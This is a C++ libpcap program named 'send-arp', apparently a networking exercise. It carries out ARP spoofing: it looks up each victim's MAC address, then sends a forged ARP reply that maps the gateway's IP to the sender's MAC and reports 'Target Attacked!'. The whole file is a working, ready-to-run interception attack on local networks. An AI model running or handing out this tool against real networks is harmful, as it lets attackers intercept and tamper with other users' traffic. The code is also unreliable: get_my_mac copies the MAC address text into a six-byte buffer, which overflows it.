#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

pcap_t* handle;

void get_my_mac(char* dev, char* mac){
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());
	if (str.length() > 0) {
		strcpy(mac, str.c_str());
	}
}

int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac; // inp
    packet.eth_.smac_ = smac; // inp
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ =  Ip::SIZE;
    isRequest ? packet.arp_.op_ = htons(ArpHdr::Request) : packet.arp_.op_ = htons(ArpHdr::Reply); //
    packet.arp_.smac_ = smac; // inp
    packet.arp_.sip_ = htonl(sip); // inp
    packet.arp_.tmac_ = tmac; // inp
	
    packet.arp_.tip_ = htonl(tip); // inp

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}


int main(int argc, char* argv[]) {
	if (argc <4 || (argc%2)!=0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	char my_mac[Mac::SIZE];
	get_my_mac(dev, my_mac);

	EthArpPacket packet;
	
	for(int i=1;i<argc/2;i++){
		std::string victim_mac;
		std::string victim_ip=std::string(argv[2*i]);
		std::string gateway_ip=std::string(argv[2*i+1]);

		send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),Mac(my_mac),Mac::nullMac(),Ip("0.0.0.0"),Ip(victim_ip),true);
		while(true){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res=pcap_next_ex(handle,&header,&packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			EthHdr* eth = (EthHdr*)packet;
			if(eth->type()==EthHdr::Arp){
				ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
				std::string arp_sip = std::string(arp->sip());
				if (arp->op() == ArpHdr::Reply && arp_sip.compare(victim_ip) == 0) {
					victim_mac = std::string(arp->smac());
					break;
				}
			}
		}
		if(send_packet_arp(Mac(victim_mac),Mac(my_mac),Mac(victim_mac),Ip(gateway_ip),Ip(victim_ip),false)==0){
			printf("Target %d Attacked!\n", i);
		}
	}
	pcap_close(handle);
}